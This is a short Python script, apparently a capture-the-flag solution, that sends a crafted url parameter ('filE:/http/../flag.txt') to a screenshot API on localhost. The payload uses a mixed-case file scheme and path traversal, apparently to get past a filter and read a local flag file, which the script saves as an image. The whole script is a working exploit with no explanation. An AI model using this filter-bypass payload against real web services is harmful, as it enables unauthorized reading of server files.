import requests
import shutil

url = 'http://localhost:80/api/screenshot'

payload = 'filE:/http/../flag.txt'
r = requests.get(url + '/?url=' + payload, stream=True)
file_name = 'flag.png'
if r.status_code == 200:
    with open(file_name,'wb') as f:
        shutil.copyfileobj(r.raw, f)
    print('Image sucessfully Downloaded: ',file_name)

print(r.text)